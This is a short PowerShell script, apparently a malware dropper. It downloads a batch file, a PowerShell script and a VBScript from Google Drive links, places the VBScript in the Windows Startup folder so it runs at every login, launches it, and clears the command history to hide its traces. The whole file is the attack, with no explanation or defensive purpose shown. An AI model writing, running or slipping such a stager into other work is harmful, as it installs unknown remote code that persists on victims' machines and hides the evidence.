cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1bK98ZA1aeVEWEVpygfopuwLtWfccsPpo" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1FFNPRwKOhMnO5lDxXO3XaUhkZPp31sfP" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1y0Z3z4JqElnSYiZXA5-G9jt7PKyUVXcN" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit
